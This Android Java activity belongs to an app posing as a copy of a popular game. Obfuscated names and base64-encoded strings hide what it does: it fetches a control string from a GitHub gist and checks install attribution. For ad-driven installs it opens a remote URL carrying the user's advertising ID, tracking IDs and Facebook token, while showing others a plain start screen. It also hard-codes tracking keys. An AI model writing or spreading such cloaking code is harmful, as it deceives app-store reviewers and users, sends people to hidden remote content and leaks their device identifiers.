package com.robtopx.geometr;

import static com.robtopx.geometr.MainActivity.decodeHS;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

public class HS extends AppCompatActivity {

    ImageView imageViewProg;
    TextView textViewStartHS, textViewCloseHS, textViewInternetHS;

    public static String cscsth;
    public static String bgfre = "-";
    public static String nhfgtcv;
    public static String bbgty;
    public static String bgdscx = "5yckAAPdQz32P3ozXvAgWo";
    public static String vfrsxt;
    public static String vfrtyf;
    public static String vtefs;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.hs);
        initda();
        jfj();
        hfj();
        iudh();

        cscsth = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    nhfgtcv = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                } catch (Exception e) {

                }
            }
        }).start();

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId("990f1f3c-29a5-4233-a627-3526d1bda14e");
        OneSignal.setExternalUserId(nhfgtcv);


        if (!fgdsh()) {
            textViewInternetHS.setVisibility(View.VISIBLE);
            imageViewProg.setVisibility(View.INVISIBLE);
        } else {

            String idh = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(decodeHS("c2F2ZWRVcmw="), decodeHS("bnVsbA=="));
            if (!idh.equals(decodeHS("bnVsbA=="))) {
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                intent.putExtra("bul", true);
                intent.putExtra("llll", idh);
                startActivity(intent);
                finishAffinity();

            } else {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            odj("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjE5OTMyNC9kMGFkMjdkYmNkYWU2N2MzYTI4OTRlMTEwMjhiYWQxMS9yYXcvSGVhZG9mU3BvcnRz");

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    ffff();
                                    ufu();
                                    new CountDownTimer(15000, 1000) {

                                        @Override
                                        public void onTick(long l) {
                                            if (!bgfre.equals("-") || !ftdcg.equals("-")) {
                                                cancel();
                                                startWe();
                                            } else {

                                            }
                                        }

                                        @Override
                                        public void onFinish() {
                                            startWe();
                                        }
                                    }.start();
                                }
                            });

                        } catch (Exception e) {

                        }
                    }
                }).start();
            }


        }


    }

    private void startWe() {

        if (bgfre.equals(decodeHS("Tm9uLW9yZ2FuaWM="))) {
            String vdrds = vdw + bbgty;
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeHS("c2F2ZWRVcmw="), vdrds).apply();
            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
            intent.putExtra("bul", true);
            intent.putExtra("llll", vdrds);
            startActivity(intent);
            finishAffinity();


        } else if (bgft != null) {
            String tytew = vdw + ftdcg;
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeHS("c2F2ZWRVcmw="), tytew).apply();
            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
            intent.putExtra("bul", true);
            intent.putExtra("llll", tytew);
            startActivity(intent);
            finishAffinity();


        } else {
            if (vfdr.equals("0")) {
                imageViewProg.setVisibility(View.INVISIBLE);
                textViewStartHS.setVisibility(View.VISIBLE);
                textViewCloseHS.setVisibility(View.VISIBLE);

            } else {

                String bfrew = vdw + decodeHS("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                        decodeHS("Jmdvb2dsZV9hZGlkPQ==") + nhfgtcv +
                        decodeHS("JmFmX3VzZXJpZD0=") + cscsth +
                        decodeHS("JmRldl9rZXk9") + bgdscx +
                        decodeHS("JmJ1bmRsZT0=") + getPackageName() +
                        decodeHS("JmZiX2FwcF9pZD0=") + zxsa +
                        decodeHS("JmZiX2F0PQ==") + nytr;
                getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeHS("c2F2ZWRVcmw="), bfrew).apply();
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                intent.putExtra("bul", true);
                intent.putExtra("llll", bfrew);
                startActivity(intent);
                finishAffinity();

            }
        }
    }

    private void ufu() {

        AppEventsLogger.activateApp(getApplication());
        AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData vfdr) {
                if (vfdr == null) {
                    vfdr = AppLinkData.createFromActivity(HS.this);

                }
                if (vfdr != null) {

                    String[] as = vfdr.getTargetUri().toString().split("://");
                    bgft = as[1];
                    ftdcg = parseHS(bgft);

                } else {

                }
            }
        });
    }

    public static String bgft = null;
    public static String ftdcg = "-";

    private void ffff() {
        FacebookSdk.setApplicationId(zxsa);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
    }

    private void iudh() {
        AppsFlyerLib.getInstance().init(bgdscx, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                bgfre = map.get(decodeHS("YWZfc3RhdHVz")).toString();

                if (bgfre.equals(decodeHS("Tm9uLW9yZ2FuaWM="))) {


                    try {
                        vfrsxt = map.get(decodeHS("Y2FtcGFpZ24=")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        vfrtyf = map.get(decodeHS("bWVkaWFfc291cmNl")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        vtefs = map.get(decodeHS("YWZfY2hhbm5lbA==")).toString();
                    } catch (Exception e) {

                    }

                    bbgty = parseHS(vfrsxt);

                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
    }

    private void hfj() {
        textViewStartHS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                intent.putExtra("bul", false);
                startActivity(intent);
                finishAffinity();

            }
        });
        textViewCloseHS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });

        textViewInternetHS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), HS.class));
                finishAffinity();
            }
        });

    }

    private void initda() {
        imageViewProg = findViewById(R.id.imageViewProg);
        textViewStartHS = findViewById(R.id.textViewStartHS);
        textViewCloseHS = findViewById(R.id.textViewCloseHS);
        textViewInternetHS = findViewById(R.id.textViewInternetHS);
    }

    private void jfj() {
        Handler handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                imageViewProg.setRotation(imageViewProg.getRotation() + 20);
                handler.postDelayed(this::run, 50);
            }
        });
    }


    public String parseHS(String scss) {
        String hyh;
        String bgfu;
        String swef;
        String vfdttttttth;
        String vfdrg;
        String vftyg;
        String cdew;
        String vfeq;
        String vffd;
        String bght;

        String[] rre = scss.split("_");

        try {
            hyh = rre[0];
        } catch (Exception e) {

            hyh = "";
        }
        try {
            bgfu = rre[1];
        } catch (Exception e) {

            bgfu = "";
        }
        try {
            swef = rre[2];
        } catch (Exception e) {
            swef = "";

        }
        try {
            vfdttttttth = rre[3];
        } catch (Exception e) {
            vfdttttttth = "";

        }
        try {
            vfdrg = rre[4];
        } catch (Exception e) {
            vfdrg = "";
            ;
        }
        try {
            vftyg = rre[5];
        } catch (Exception e) {
            vftyg = "";

        }

        try {
            cdew = rre[6];
        } catch (Exception e) {
            cdew = "";
        }
        try {
            vfeq = rre[7];
        } catch (Exception e) {
            vfeq = "";
        }
        try {
            vffd = rre[8];
        } catch (Exception e) {
            vffd = "";
        }
        try {
            bght = rre[9];
        } catch (Exception e) {
            bght = "";
        }

        String sss[] = {decodeHS("P21lZGlhX3NvdXJjZT0="), vfrtyf,
                decodeHS("JnN1YjE9"), hyh,
                decodeHS("JnN1YjI9"), bgfu,
                decodeHS("JnN1YjM9"), swef,
                decodeHS("JnN1YjQ9"), vfdttttttth,
                decodeHS("JnN1YjU9"), vfdrg,
                decodeHS("JnN1YjY9"), vftyg,
                decodeHS("JnN1Yjc9"), cdew,
                decodeHS("JnN1Yjg9"), vfeq,
                decodeHS("JnN1Yjk9"), vffd,
                decodeHS("JnN1YjEwPQ=="), bght,
                decodeHS("JmNhbXBhaWduPQ=="), vfrsxt,
                decodeHS("Jmdvb2dsZV9hZGlkPQ=="), nhfgtcv,
                decodeHS("JmFmX3VzZXJpZD0="), cscsth,
                decodeHS("JmFmX2NoYW5uZWw9"), vtefs,
                decodeHS("JmRldl9rZXk9"), bgdscx,
                decodeHS("JmJ1bmRsZT0="), getPackageName(),
                decodeHS("JmZiX2FwcF9pZD0="), zxsa,
                decodeHS("JmZiX2F0PQ=="), nytr};

        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < sss.length; i++) {
            stringBuilder.append(sss[i]);
        }

        return stringBuilder.toString();
    }

    public static String vfdr;
    public static String vdw;
    public static String nytr;
    public static String zxsa;

    private void odj(String ds) throws Exception {
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(decodeHS(ds)).openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
        String[] gh = bufferedReader.readLine().split("_");
        vfdr = gh[0];
        vdw = gh[1];
        nytr = gh[2];
        zxsa = gh[3];

    }

    private boolean fgdsh() {
        String xscsa = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager dghsu = (ConnectivityManager) getSystemService(xscsa);
        if (dghsu.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }
}
